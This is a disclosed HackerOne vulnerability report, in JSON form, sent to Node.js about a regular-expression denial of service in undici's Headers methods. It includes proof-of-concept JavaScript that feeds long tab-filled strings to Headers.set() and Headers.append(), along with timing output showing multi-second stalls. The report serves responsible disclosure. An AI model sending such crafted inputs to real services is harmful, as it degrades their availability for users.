{
  "id": 1784449,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzg0NDQ5",
  "url": "https://hackerone.com/reports/1784449",
  "title": "Regular Expression Denial of Service in Headers",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-11-25T22:30:39.730Z",
  "submitted_at": "2022-11-25T22:30:39.850Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "sno2",
    "url": "/sno2",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-03-19T17:11:28.970Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2023-02-17T17:11:24.527Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** ReDoS vulnerabilities in Headers class.\n\n**Description:** The `Headers.set()` and `Headers.append()` methods are vulnerable to Regular Expression Denial of Service (ReDoS) attacks when untrusted values are passed into the functions.  This is due to the inefficient regular expression used to normalize the values in the `headerValueNormalize()` utility function.\n\n## Steps To Reproduce:\n\n  1. Install undici (npm install undici@5.13)\n  2. Run the following program:\n```js\nconst { Headers } = require(\"undici\");\n\nconst headers = new Headers();\nconst attack = \"a\" + \"\\t\".repeat(50_000) + \"\\ta\";\nconst start = performance.now();\nheaders.append(\"foo\", attack);\nconsole.log(`${performance.now() - start}ms`);\n```\n\n## Impact: The code takes almost 3 seconds to run because of the inefficient regular expression used in `Headers.append()`\n\n## Supporting Material/References:\n  * Cause of vulnerability: https://github.com/nodejs/undici/blob/main/lib/fetch/headers.js#L18-L30\n  * Both the `Headers.set()` and `Headers.append()` functions are affected.\n```js\nconst { Headers } = require(\"undici\");\n\nconsole.log(\"Headers.set()\");\nfor (let i = 0; i <= 5; i++) {\n  const headers = new Headers();\n  const attack = \"a\" + \"\\t\".repeat(i * 10_000) + \"\\ta\";\n  const start = performance.now();\n  headers.set(\"foo\", attack);\n  console.log(`${attack.length}: ${performance.now() - start}ms`);\n}\n\nconsole.log(\"\\nHeaders.append()\");\nfor (let i = 0; i <= 5; i++) {\n  const headers = new Headers();\n  const attack = \"a\" + \"\\t\".repeat(i * 10_000) + \"\\ta\";\n  const start = performance.now();\n  headers.append(\"foo\", attack);\n  console.log(`${attack.length}: ${performance.now() - start}ms`);\n}\n```\n\n```txt\nHeaders.set()\n3: 0.4767999998293817ms\n10003: 108.30930000031367ms\n20003: 417.9063999997452ms\n30003: 949.7406999999657ms\n40003: 1662.9593000002205ms\n50003: 2645.8285000002943ms\n\nHeaders.append()\n3: 0.27730000019073486ms\n10003: 111.98060000035912ms\n20003: 430.24649999989197ms\n30003: 996.5332000004128ms\n40003: 1706.5194999999367ms\n50003: 2932.2003999999724ms\n```\n\n## Impact\n\nAn attacker can immobilize an unsuspecting user of this package for a few seconds if untrusted input is passed into the unsafe `Headers` methods.",
  "weakness": {
    "id": 48,
    "name": "Uncontrolled Resource Consumption"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-03-19T17:11:24.626Z",
  "allow_singular_disclosure_after": -79157700.94149108,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "zy9ard3",
    "shubham_srt",
    "anomander"
  ],
  "severity": {
    "rating": "low",
    "score": 3.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
